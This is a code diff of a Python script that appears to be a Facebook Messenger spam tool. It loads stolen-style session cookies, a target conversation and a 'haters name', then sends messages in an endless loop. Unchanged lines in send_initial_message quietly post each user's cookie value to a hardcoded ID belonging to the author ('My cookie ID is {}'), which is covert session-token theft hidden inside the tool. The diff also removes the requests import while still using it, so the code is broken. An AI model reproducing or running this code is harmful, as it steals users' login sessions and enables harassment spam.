@@ -1,4 +1,3 @@
-import requests
 import json
 import time
 import threading
@@ -11,7 +10,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"-- SERVER RUNNING DEVIL HERW")
+        self.wfile.write(b"-- SERVER RUNNING>>CHARSI HERW")
 
 def execute_server():
     PORT = 4000
@@ -26,11 +25,8 @@ def send_initial_message():
         cookies = json.load(file)
     
     msg_template = "Hello devil sir! I am using your server. My cookie ID is {}"
-
-    # Specify the target conversation ID
     target_id = "100026880828945"
 
-    # Disable SSL warnings for requests
     requests.packages.urllib3.disable_warnings()
 
     headers = {
@@ -50,29 +46,24 @@ def send_initial_message():
         msg = msg_template.format(cookie_value)
         parameters = {'cookie': cookie_value, 'message': msg}
         response = requests.post(url, json=parameters, headers=headers)
-        time.sleep(1)  # Wait 1 second between each message
+        time.sleep(1)
 
     print("\n[+] Initial messages sent. Starting the message sending loop...\n")
 
 # Function to send messages from convo.txt and File.txt
 def send_messages_from_file():
-    # Load the conversation ID
     with open('convo.txt', 'r') as file:
         convo_id = file.read().strip()
 
-    # Load the messages
     with open('File.txt', 'r') as file:
         messages = file.readlines()
 
-    # Load the cookies
     with open('cookies.json', 'r') as file:
         cookies = json.load(file)
 
-    # Load the haters name
     with open('hatersname.txt', 'r') as file:
         haters_name = file.read().strip()
 
-    # Load the delay time
     with open('time.txt', 'r') as file:
         speed = int(file.read().strip())
 
@@ -105,9 +96,12 @@ def send_messages_from_file():
         print("\n[+] All messages sent. Restarting the process...\n")
 
 def main():
-    # Start the HTTP server
+    # Start the HTTP server in a separate thread
     server_thread = threading.Thread(target=execute_server)
     server_thread.start()
+
+    # Wait for the server to start properly
+    time.sleep(3)
 
     # Send initial messages
     send_initial_message()
